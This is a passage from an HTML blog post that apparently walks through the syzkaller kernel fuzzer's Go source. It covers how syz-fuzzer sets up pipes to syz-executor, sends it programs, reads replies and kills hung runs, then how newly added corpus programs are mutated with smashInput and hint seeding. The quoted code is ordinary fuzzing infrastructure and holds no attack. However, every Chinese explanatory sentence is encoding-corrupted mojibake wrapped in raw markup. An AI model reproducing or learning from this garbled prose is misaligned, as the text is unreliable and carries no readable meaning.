class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> c != <span class="hljs-literal">nil</span> &#123;<br>c.<span class="hljs-built_in">close</span>()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">if</span> err := os.Chmod(dir, <span class="hljs-number">0777</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to chmod temp dir: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ›å»ºä¸‰ä¸ªç”¨ä»¥ä¸ <code>syz-executor</code> é€šä¿¡çš„ç®¡é“ï¼Œåˆ†åˆ«ç”¨äºæ•è·è¾“å‡ºã€å‘ executor ä¼ é€’å‘½ä»¤ã€ä» executor æ¥æ”¶å‘½ä»¤ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Output æ•è·ç®¡é“.</span><br>rp, wp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> wp.Close()<br><br><span class="hljs-comment">// executor-&gt;ipc å‘½ä»¤ç®¡é“.</span><br>inrp, inwp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inwp.Close()<br>c.inrp = inrp<br><br><span class="hljs-comment">// ipc-&gt;executor å‘½ä»¤ç®¡é“.</span><br>outrp, outwp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> outrp.Close()<br>c.outwp = outwp<br><br>c.readDone = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šè°ƒç”¨ <code>osutil</code> ä¸­çš„ <code>Command()</code> åˆ›å»ºä¸€ä¸ª <code>exec.Cmd</code> å®ä¾‹ï¼ˆè¯¥å‡½æ•°ä¸º golag åŸç”Ÿçš„ <code>exec.Command()</code> çš„ wrapperï¼‰ï¼Œexecutor å®é™…ä¸Šè¦ç­‰åˆ°åé¢æ˜¾å¼è°ƒç”¨ <code>Start()</code> æˆ– <code>Run()</code> æ‰æ­£å¼å¼€å§‹è¿è¡Œï¼ˆå‚è§<a href="https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter10/10.1.html">åˆ›å»ºè¿›ç¨‹ Â· Goè¯­è¨€æ ‡å‡†åº“</a>ï¼‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">cmd := osutil.Command(bin[<span class="hljs-number">0</span>], bin[<span class="hljs-number">1</span>:]...)<br><span class="hljs-keyword">if</span> inFile != <span class="hljs-literal">nil</span> &amp;&amp; outFile != <span class="hljs-literal">nil</span> &#123;<br>cmd.ExtraFiles = []*os.File&#123;inFile, outFile&#125;<br>&#125;<br>cmd.Dir = dir<br><span class="hljs-comment">// Tell ASAN to not mess with our NONFAILING.</span><br>cmd.Env = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>([]<span class="hljs-type">string</span>&#123;&#125;, os.Environ()...), <span class="hljs-string">&quot;ASAN_OPTIONS=handle_segv=0 allow_user_segv_handler=1&quot;</span>)<br>cmd.Stdin = outrp<br>cmd.Stdout = inwp<br></code></pre></td></tr></table></figure><p>è‹¥æ˜¯æœªè®¾ç½® <code>FlagDebug</code> åˆ™è¿˜ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹æŒç»­è¯»å– syz-executor è¾“å‡ºç®¡é“ä¸­çš„å†…å®¹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> config.Flags&amp;FlagDebug != <span class="hljs-number">0</span> &#123;<br><span class="hljs-built_in">close</span>(c.readDone)<br>cmd.Stderr = os.Stdout<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cmd.Stderr = wp<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *command)</span></span> &#123;<br><span class="hljs-comment">// è¯»å‡ºè¾“å‡ºä»¥é˜² executor æŒç»­åœ°æ‰“å°ä¸€äº›ä¸œè¥¿ã€‚</span><br><span class="hljs-keyword">const</span> bufSize = <span class="hljs-number">128</span> &lt;&lt; <span class="hljs-number">10</span><br>output := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, bufSize)<br><span class="hljs-keyword">var</span> size <span class="hljs-type">uint64</span><br><span class="hljs-keyword">for</span> &#123;<br>n, err := rp.Read(output[size:])<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">0</span> &#123;<br>size += <span class="hljs-type">uint64</span>(n)<br><span class="hljs-keyword">if</span> size &gt;= bufSize*<span class="hljs-number">3</span>/<span class="hljs-number">4</span> &#123;<br><span class="hljs-built_in">copy</span>(output, output[size-bufSize/<span class="hljs-number">2</span>:size])<br>size = bufSize / <span class="hljs-number">2</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>rp.Close()<br>c.readDone &lt;- output[:size]<br><span class="hljs-built_in">close</span>(c.readDone)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;(c)<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨ <code>cmd.Start()</code> çœŸæ­£å¯åŠ¨ syz-executorï¼ˆè¯¥æ–¹æ³•ä¸ä¼šé˜»å¡çˆ¶è¿›ç¨‹ï¼‰ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹ç­‰å¾… syz-executor çš„é€€å‡ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err := cmd.Start(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to start executor binary: %v&quot;</span>, err)<br>&#125;<br>c.exited = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, <span class="hljs-number">1</span>)<br>c.cmd = cmd<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *command)</span></span> &#123;<br>err := c.cmd.Wait()<br>c.exited &lt;- err<br><span class="hljs-built_in">close</span>(c.exited)<br><span class="hljs-comment">// è‹¥ cmd.Stderr å·²è¢«æ³„éœ²ç»™å¦ä¸€ä¸ªæ´»åŠ¨è¿›ç¨‹ï¼Œé˜²æ­¢ livelock.</span><br>rp.SetDeadline(time.Now().Add(<span class="hljs-number">5</span> * time.Second))<br>&#125;(c)<br>wp.Close()<br><span class="hljs-comment">// æ³¨æ„: å°½ç®¡æˆ‘ä»¬åœ¨ä¸Šé¢ defer äº†ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨ğŸ¤å‰æ˜ç¡®åœ°å…³é—­ inwp.</span><br><span class="hljs-comment">// è‹¥æˆ‘ä»¬ä¸è¿™ä¹ˆåšä¸” executor åœ¨å†™å…¥ğŸ¤ç­”å¤å‰é€€å‡ºäº†,</span><br><span class="hljs-comment">// ç”±äºæˆ‘ä»¬æŒæœ‰å¦ä¸€ä¸ªæ‰“å¼€çš„ç®¡é“æœ«ç«¯ï¼Œä» inrp ä¸Šè¯»å–å°†æŒ‚èµ·.</span><br>inwp.Close()<br><br><span class="hljs-keyword">if</span> c.config.UseForkServer &#123;<br><span class="hljs-keyword">if</span> err := c.handshake(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>tmp := c<br>c = <span class="hljs-literal">nil</span> <span class="hljs-comment">// disable defer above</span><br><span class="hljs-keyword">return</span> tmp, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ã€æ ¸å¿ƒã€‘cmd-exec-ï¼šå°†å•ä¸ªç¨‹åºè¾“å…¥ä¼ é€’ç»™-syz-executor-æ‰§è¡Œ"><a href="#ã€æ ¸å¿ƒã€‘cmd-exec-ï¼šå°†å•ä¸ªç¨‹åºè¾“å…¥ä¼ é€’ç»™-syz-executor-æ‰§è¡Œ" class="headerlink" title="ã€æ ¸å¿ƒã€‘cmd.exec()ï¼šå°†å•ä¸ªç¨‹åºè¾“å…¥ä¼ é€’ç»™ syz-executor æ‰§è¡Œ"></a>ã€æ ¸å¿ƒã€‘cmd.exec()ï¼šå°†å•ä¸ªç¨‹åºè¾“å…¥ä¼ é€’ç»™ syz-executor æ‰§è¡Œ</h4><p><code>command.exec()</code> å‡½æ•°ç”¨ä»¥å°†ä¸€ä¸ªåºåˆ—åŒ–åçš„è¾“å…¥ä¼ é€’ç»™ syz-executor è¿›ç¨‹æ‰§è¡Œï¼Œä¼ é€’çš„æ–¹å¼ä¸»è¦æ˜¯é€šè¿‡åœ¨ <code>makeCommand()</code> ä¸­å»ºç«‹çš„ <code>ipcâ†’executor</code> ç®¡é“å®Œæˆçš„ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *command)</span></span> exec(opts *ExecOpts, progData []<span class="hljs-type">byte</span>) (output []<span class="hljs-type">byte</span>, hanged <span class="hljs-type">bool</span>, err0 <span class="hljs-type">error</span>) &#123;<br>req := &amp;executeReq&#123;<br>magic:            inMagic,<br>envFlags:         <span class="hljs-type">uint64</span>(c.config.Flags),<br>execFlags:        <span class="hljs-type">uint64</span>(opts.Flags),<br>pid:              <span class="hljs-type">uint64</span>(c.pid),<br>syscallTimeoutMS: <span class="hljs-type">uint64</span>(c.config.Timeouts.Syscall / time.Millisecond),<br>programTimeoutMS: <span class="hljs-type">uint64</span>(c.config.Timeouts.Program / time.Millisecond),<br>slowdownScale:    <span class="hljs-type">uint64</span>(c.config.Timeouts.Scale),<br>progSize:         <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(progData)),<br>&#125;<br>reqData := (*[unsafe.Sizeof(*req)]<span class="hljs-type">byte</span>)(unsafe.Pointer(req))[:]<br><span class="hljs-keyword">if</span> _, err := c.outwp.Write(reqData); err != <span class="hljs-literal">nil</span> &#123;<br>output = &lt;-c.readDone<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: failed to write control pipe: %v&quot;</span>, c.pid, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> progData != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> _, err := c.outwp.Write(progData); err != <span class="hljs-literal">nil</span> &#123;<br>output = &lt;-c.readDone<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: failed to write control pipe: %v&quot;</span>, c.pid, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// åœ¨è¿™ä¸ªç‚¹ç¨‹åºå·²ç»å¼€å§‹è¿è¡Œäº†.</span><br></code></pre></td></tr></table></figure><p>å¯¹äºå•ä¸ªè¾“å…¥ç¨‹åºçš„ä¼ è¾“å®é™…ä¸Šä¼šå…ˆä¼ é€’ä¸€ä¸ª <code>executeReq</code> å¤´éƒ¨ï¼Œæ¥ä¸‹æ¥å†ä¼ é€’åºåˆ—åŒ–åçš„è¾“å…¥ç¨‹åºï¼š</p><p><img src="https://s2.loli.net/2023/04/24/I6od1evyCE3MZWH.png" alt="image.png"></p><p>å½“æ•°æ®ä¼ é€’è¿‡å»ä¹‹å<strong>è¾“å…¥ç¨‹åºå°±å·²ç»å¼€å§‹æ‰§è¡Œäº†</strong>ï¼Œå› æ­¤è¯¥å‡½æ•°åé¢çš„éƒ¨åˆ†å°±éƒ½æ˜¯å¯¹ç»“æœçš„å¤„ç†ï¼›ï¼‰</p><p>å®Œæˆæ•°æ®å‘é€åä¼šå¯åŠ¨ä¸€ä¸ªåç¨‹å®šæ—¶ç­‰å¾… executor æ‰§è¡Œå®Œæ¯•ï¼Œè‹¥è¶…æ—¶åˆ™ä¼šå°† executor ç»™ kill æ‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br>hang := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>t := time.NewTimer(c.timeout)<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-t.C:<br>c.cmd.Process.Kill()<br>hang &lt;- <span class="hljs-literal">true</span><br><span class="hljs-keyword">case</span> &lt;-done:<br>t.Stop()<br>hang &lt;- <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p>éšåæ˜¯ä¸€ä¸ªæ— é™å¤§å¾ªç¯ï¼Œä» <code>executorâ†’ipc</code> ç®¡é“ä¸­è¯»å– syz-executor çš„æ‰§è¡Œç»“æœï¼ŒåŒæ ·æ˜¯ä¸€ä¸ª header <code>executeReply</code> å¸¦ä¸€ä»½æ•°æ® <code>callReply</code> ï¼Œå•æ¬¡è¯·æ±‚å¯èƒ½æœ‰å¤šä»½è¿”å›æ•°æ®å› æ­¤è¿™é‡Œæ˜¯ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œé€šè¿‡ <code>executeReply</code> ä¸­çš„ <code>done</code> æ ‡å¿—ä½æ ‡è¯†ç»“æŸï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go">exitStatus := <span class="hljs-number">-1</span><br>completedCalls := (*<span class="hljs-type">uint32</span>)(unsafe.Pointer(&amp;c.outmem[<span class="hljs-number">0</span>]))<br>outmem := c.outmem[<span class="hljs-number">4</span>:]<br><span class="hljs-keyword">for</span> &#123;<br>reply := &amp;executeReply&#123;&#125;<br>replyData := (*[unsafe.Sizeof(*reply)]<span class="hljs-type">byte</span>)(unsafe.Pointer(reply))[:]<br><span class="hljs-keyword">if</span> _, err := io.ReadFull(c.inrp, replyData); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> reply.magic != outMagic &#123;<br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;executor %v: got bad reply magic 0x%x\n&quot;</span>, c.pid, reply.magic)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">if</span> reply.done != <span class="hljs-number">0</span> &#123;<br>exitStatus = <span class="hljs-type">int</span>(reply.status)<br><span class="hljs-keyword">break</span><br>&#125;<br>callReply := &amp;callReply&#123;&#125;<br>callReplyData := (*[unsafe.Sizeof(*callReply)]<span class="hljs-type">byte</span>)(unsafe.Pointer(callReply))[:]<br><span class="hljs-keyword">if</span> _, err := io.ReadFull(c.inrp, callReplyData); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> callReply.signalSize != <span class="hljs-number">0</span> || callReply.coverSize != <span class="hljs-number">0</span> || callReply.compsSize != <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// æš‚ä¸æ”¯æŒ.</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;executor %v: got call reply with coverage\n&quot;</span>, c.pid)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-built_in">copy</span>(outmem, callReplyData)<br>outmem = outmem[<span class="hljs-built_in">len</span>(callReplyData):]<br>*completedCalls++<br>&#125;<br></code></pre></td></tr></table></figure><p>syz-fuzzer æ¥æ”¶ syz-executor è¿”å›æ•°æ®çš„ç¤ºä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2023/04/24/seE43rD2uaXCbwj.png" alt="image.png"></p><p>æœ€åæ£€æŸ¥æœ¬æ¬¡æ‰§è¡Œç»“æœï¼Œå¦‚æœè¯´æ‰§è¡Œç»“æœä¸€åˆ‡é¡ºåˆ©åˆ™ç›´æ¥è¿”å›ï¼Œ<strong>å¦åˆ™ä¼šç»ˆæ­¢ syz-executor çš„ç»§ç»­è¿è¡Œ</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">close</span>(done)<br><span class="hljs-keyword">if</span> exitStatus == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Program was OK.</span><br>&lt;-hang<br><span class="hljs-keyword">return</span><br>&#125;<br>c.cmd.Process.Kill()<br>output = &lt;-c.readDone<br><span class="hljs-keyword">if</span> err := c.wait(); &lt;-hang &#123;<br>hanged = <span class="hljs-literal">true</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>output = <span class="hljs-built_in">append</span>(output, err.Error()...)<br>output = <span class="hljs-built_in">append</span>(output, <span class="hljs-string">&#x27;\n&#x27;</span>)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> exitStatus == <span class="hljs-number">-1</span> &#123;<br>exitStatus = osutil.ProcessExitStatus(c.cmd.ProcessState)<br>&#125;<br><span class="hljs-comment">// å¿½ç•¥å…¶ä»–çš„æ‰€æœ‰é”™è¯¯.</span><br><span class="hljs-comment">// åœ¨æ²¡æœ‰ fork server çš„æƒ…å†µä¸‹ executor å¯ä»¥åˆæ³•åœ°é€€å‡º (program contains exit_group),</span><br><span class="hljs-comment">// åœ¨å¸¦æœ‰ fork server çš„æƒ…å†µä¸‹è‹¥ top process æƒ³è¦ç‰¹æ®Šçš„å¤„ç†ï¼Œåˆ™å…¶å¯ä»¥å¸¦ç€ statusFail é€€å‡º.</span><br><span class="hljs-keyword">if</span> exitStatus == statusFail &#123;<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: exit status %d\n%s&quot;</span>, c.pid, exitStatus, output)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="â‘¢-proc-smashInput-ï¼šæ‰§è¡Œå¹¶å˜å¼‚åˆšåˆšè¢«åŠ å…¥åˆ°è¯­æ–™åº“ä¸­çš„ç¨‹åºã€æ ¸å¿ƒã€‘"><a href="#â‘¢-proc-smashInput-ï¼šæ‰§è¡Œå¹¶å˜å¼‚åˆšåˆšè¢«åŠ å…¥åˆ°è¯­æ–™åº“ä¸­çš„ç¨‹åºã€æ ¸å¿ƒã€‘" class="headerlink" title="â‘¢ proc.smashInput()ï¼šæ‰§è¡Œå¹¶å˜å¼‚åˆšåˆšè¢«åŠ å…¥åˆ°è¯­æ–™åº“ä¸­çš„ç¨‹åºã€æ ¸å¿ƒã€‘"></a>â‘¢ proc.smashInput()ï¼šæ‰§è¡Œå¹¶å˜å¼‚åˆšåˆšè¢«åŠ å…¥åˆ°è¯­æ–™åº“ä¸­çš„ç¨‹åºã€æ ¸å¿ƒã€‘</h3><p><code>proc.smashInput()</code> ç”¨ä»¥<strong>æ‰§è¡Œå¹¶å˜å¼‚åˆšåˆšè¢«åŠ å…¥åˆ°è¯­æ–™åº“ä¸­çš„ç¨‹åº</strong>ï¼ˆå³ <code>WorkSmash</code> ï¼‰ï¼š</p><ul><li>é¦–å…ˆæ£€æŸ¥ <code>faultInjectionEnabled</code> ï¼Œè‹¥è®¾ç½®äº†åˆ™è°ƒç”¨ <code>proc.failCall()</code> <ul><li>è¯¥å‡½æ•°ç”¨ä»¥å°†ä¸€ä¸ª fault æ³¨å…¥åˆ°ç¨‹åºä¸­ï¼Œå…¶ä¼šå¾ªç¯ä¸€ç™¾æ¬¡ï¼Œè®¾ç½® <code>newProg.Calls[call].Props.FailNth = nth</code> ï¼ˆ<code>newProg</code> ä¸ºè¾“å…¥ç¨‹åºçš„å…‹éš†ï¼‰åè°ƒç”¨ <code>proc.executeRaw()</code> è¿›è¡Œæ‰§è¡Œ</li></ul></li><li>æ¥ä¸‹æ¥æ£€æŸ¥ <code>comparisonTracingEnabled</code> ï¼Œè‹¥è®¾ç½®äº†åˆ™è°ƒç”¨ <code>proc.executeHintSeed()</code> <strong>ä½¿ç”¨ hint è¿›è¡Œå˜å¼‚</strong></li><li>éšåè·å– syz-fuzzer å½“å‰å¿«ç…§ï¼Œå¹¶å¾ªç¯ä¸€ç™¾æ¬¡ï¼š<strong>è°ƒç”¨</strong> <code>prog.Mutate()</code> <strong>å°†è¾“å…¥ç¨‹åºè¿›è¡Œå˜å¼‚åå†è°ƒç”¨</strong> <code>proc.executeAndCollide()</code> <strong>æ‰§è¡Œå˜å¼‚åçš„ç¨‹åº</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> smashInput(item *WorkSmash) &#123;<br><span class="hljs-keyword">if</span> proc.fuzzer.faultInjectionEnabled &amp;&amp; item.call != <span class="hljs-number">-1</span> &#123;<br>proc.failCall(item.p, item.call)<br>&#125;<br><span class="hljs-keyword">if</span> proc.fuzzer.comparisonTracingEnabled &amp;&amp; item.call != <span class="hljs-number">-1</span> &#123;<br>proc.executeHintSeed(item.p, item.call)<br>&#125;<br>fuzzerSnapshot := proc.fuzzer.snapshot()<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>p := item.p.Clone()<br>p.Mutate(proc.rnd, prog.RecommendedCalls, proc.fuzzer.choiceTable, proc.fuzzer.noMutate, fuzzerSnapshot.corpus)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: smash mutated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatSmash)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å˜å¼‚å‡½æ•° <code>prog.Mutate()</code> æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚ä¸­æ·±å…¥åˆ†æï¼Œæœ¬èŠ‚æˆ‘ä»¬å…ˆæ¥çœ‹å¦å¤–ä¸¤ä¸ªå‡½æ•°ï¼š</p><h4 id="proc-executeHintSeed-ï¼šä½¿ç”¨-hint-å˜å¼‚ç¨‹åºå¹¶æ‰§è¡Œ"><a href="#proc-executeHintSeed-ï¼šä½¿ç”¨-hint-å˜å¼‚ç¨‹åºå¹¶æ‰§è¡Œ" class="headerlink" title="proc.executeHintSeed()ï¼šä½¿ç”¨ hint å˜å¼‚ç¨‹åºå¹¶æ‰§è¡Œ"></a>proc.executeHintSeed()ï¼šä½¿ç”¨ hint å˜å¼‚ç¨‹åºå¹¶æ‰§è¡Œ</h4><p>è¯¥å‡½æ•°é¦–å…ˆä¼šå°†è¾“å…¥ç¨‹åºæ‰§è¡Œä¸€æ¬¡ï¼Œæ¥ä¸‹æ¥è°ƒç”¨ <code>prog.MutateWithHints</code> ä½¿ç”¨æ‰§è¡Œæ‰€å¾—çš„ CompMap <strong>å¯¹è¾“å…¥ç¨‹åºä¸­çš„ä¸€äº›å‚æ•°å€¼è¿›è¡Œæ›¿æ¢</strong>ï¼Œæœ€åå†å°†è¯¥è¾“å…¥ç¨‹åºæ‰§è¡Œä¸€æ¬¡ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeHintSeed(p *prog.Prog, call <span class="hljs-type">int</span>) &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: collecting comparisons&quot;</span>, proc.pid)<br><span class="hljs-comment">// é¦–å…ˆæ‰§è¡ŒåŸå§‹ç¨‹åºä»¥ä» KCOV è·å–æ¯”è¾ƒå€¼.</span><br>info := proc.execute(proc.execOptsComps, 